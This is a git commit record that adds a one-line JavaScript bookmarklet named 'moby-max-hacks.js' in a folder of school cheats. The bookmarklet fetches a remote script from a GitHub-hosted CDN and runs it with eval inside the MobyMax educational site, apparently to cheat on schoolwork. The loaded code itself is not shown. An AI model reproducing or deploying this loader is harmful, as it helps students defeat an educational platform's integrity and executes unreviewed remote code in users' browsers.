312c3918994b4f3f1c362add1a5b31dcfdaaa915
randomgames3 <128182562+rmxzyz@users.noreply.github.com>
2023-03-22 11:57:50 -0700

    Create moby-max-hacks.js

---
+++ other-school-cheats/moby-max-hacks.js
@@ -0,0 +1,1 @@
+javascript:try{(req=new XMLHttpRequest).open("GET","https://cdn.jsdelivr.net/gh/VirescentOverlord/Moby-Max-Hack@main/Main%20Script"),req.onload=function(){eval(this.responseText+"m.appendChild(r)")},req.send()}catch(err){alert(err)}
